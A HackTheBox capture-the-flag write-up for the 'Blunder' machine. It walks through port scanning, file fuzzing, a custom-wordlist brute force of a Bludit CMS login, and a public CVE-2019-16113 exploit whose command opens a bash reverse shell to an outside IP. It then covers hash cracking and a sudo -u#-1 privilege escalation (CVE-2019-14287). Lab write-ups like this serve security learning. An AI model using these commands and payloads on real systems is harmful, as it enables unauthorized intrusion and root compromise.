# Blunder | HackTheBox

### 1. Scan
```bash
root@kali:/home/kali/Desktop/htb# nmap -sV 10.10.10.191 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 22:39 EDT
Stats: 0:07:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 76.45% done; ETC: 22:49 (0:02:18 remaining)
Nmap scan report for 10-10-10-191.tpgi.com.au (10.10.10.191)
Host is up (0.34s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 583.32 seconds
```
The only service currently available is a HTTP web server.


### 2. Enumerate web server
Checked every page, only really 2 pages accessable through links, plus an image directory that can be explored but nothing that stood out as interesting. I began enumerating the pages using dirbuster, recursebuster and gobuster. Through these tools I was able to find the admin page located at: 10.10.10.191/admin/, however not much else. I knew there had to be something else, but it just wasn't revealing itself. I just resolved to enumerating everything possible, trying out different tools and techniques to try and find something.  
  
When using wfuzz to search for accessible files, I picked up several files, including one called "todo.txt".

```bash
kali@kali:/usr/share/wordlists/dirbuster$ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -z file,/usr/share/wordlists/wfuzz/general/extensions_common.txt --sc 200 http://10.10.10.191/FUZZFUZ2Z
...
000007225:   200        70 L     157 W    2385 Ch     "admin - /"                               
000020012:   200        0 L      5 W      30 Ch       "install - .php"
000049839:   200        1 L      4 W      22 Ch       "robots - .txt"
000087027:   200        4 L      23 W     118 Ch      "todo - .txt"
```

Reading this file, it contains:
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

This reveals a possible user that can be used with the admin login form. I still couldn't figure out how to get the password. I searched everywhere, ran a few more enumeration passes but came up empty handed. This was a huge rabbit hole and I couldn't really figure out where to go.  

### 3. Discover the password
I considered the possibility that I might need to use a wordlist to crack the login page. I searched online and found a vulnerability that allowed enumeration of passwords in Blundit. I thought I could use this to attack the login page and find out the password, but this didn't work.  
https://github.com/bludit/bludit/pull/1090  
  
After a while of getting nowhere I got a hint from the HTB forums to use what was in front of me, which sparked the idea to construct a custom wordlist from the page's content, and use that in the script.

```bash
kali@kali:~/Desktop/htb$ curl http://10.10.10.191/ | sed 's/<\/*[^>]*>//g' > blogcontent.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7562  100  7562    0     0   9370      0 --:--:-- --:--:-- --:--:--  9358

kali@kali:~/Desktop/htb$ python bluditenum.py
...
[*] Trying: video
[*] Trying: |
[*] Trying: Book
[*] Trying: (2007).
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

### 4. Log in and do more enumeration
Logging in with the creds reveals a pretty ordinary looking back-end. The only thing that stood out to me was the possiblility of a PHP webshell through one of the image-upload forms. There were a few to look at, but none of the ones I found seemed to work.  
  
By using view-source on the page, I was able to find out the Bludit CMS version, and then do a search for vulnerabilities.  
I found this one which looked good: https://www.cvedetails.com/cve/CVE-2019-16113/  

### 5. Gain access through exploit
I went to use the metaspoilt module first. From what I could tell by discussing with others later on, this SHOULD have worked, but for some reason it just kept failing. I tried attempting to debug it using Wireshark, but nothing stood out as being a problem. Eventually I went looking for another way to do the exploit, and found a different script: https://github.com/cybervaca/CVE-2019-16113. To my relief, this one ended up working.  

```bash
kali@kali:~/Desktop/htb/CVE-2019-16113$ python CVE-2019-16113.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c "bash -c 'bash -i >& /dev/tcp/10.10.14.20/1337 0>&1'"
[+] csrf_token: d1b01000e24bf5af6f34ead174816adb331cc63e
[+] cookie: 822n2v20moq7vek532q4ef1de6
[+] csrf_token: 08099658578243abe74bdf2ae00d181dac236cf4
[+] Uploading wnqirypr.jpg
[+] Executing command: bash -c 'bash -i >& /dev/tcp/10.10.14.20/1337 0>&1'
[+] Delete: .htaccess
[+] Delete: wnqirypr.jpg
```

### 6. Enumerate from the foothold
This exploit gained me the www-data user, which prevented me from actually reading a lot of files. However I had an idea of what might be accessible, and so prioritised checking the network service files, including the ftp service that was noticed during the scan. In the /ftp directory I found a note amongst some random files:

```bash
www-data@blunder:/ftp$ cat note.txt

Hey Sophie
I've left the thing you're looking for in here for you to continue my work
when I leave. The other thing is the same although Ive left it elsewhere too.

Its using the method we talked about; dont leave it on a post-it note this time!

Thanks
Shaun
```

This seemed to obviously suggest a password was located somewhere, just in a different location. This led to some more desperate searching, making heavy use of grep to search inside directories with a lot of stuff. That was how I found a password hash.
```bash
www-data@blunder:/var/www/bludit-3.10.0a$ grep -R password
...
bl-content/databases/users.php:        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
```
Using Crackstation, I was able to find out this hash corresponds to the plaintext password of Password120.

### 7. Try password with users
I knew at this point this was probably the password to a user account, so it was just a matter of trying it with each user account on the machine.
```bash
www-data@blunder:/home$ su - hugo
Password: Password120

hugo@blunder:~$ cat user.txt
```
The password belonged to the user hugo, which allowed me to claim the user flag.

### 8. Escalate privileges
When I got the user, straight away I did sudo -l and noted the root account appeared to be disabled for the user.
```bash
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

After some more searching online, I found a page: https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability that did a great job of explaining a recent vulnerability found with sudo, that would allow me to bypass the restriction.  

By doing sudo and supplying a uid of -1, it gets treated the same as the root user's id of 0, which runs the given command as root despite anything dictated in the sudoers file.

My current situation matched the requirements for exploitation, so I knew I had to try it.
```bash
hugo@blunder:~$ sudo -u#-1 bash   

root@blunder:/home/hugo# whoami
root
```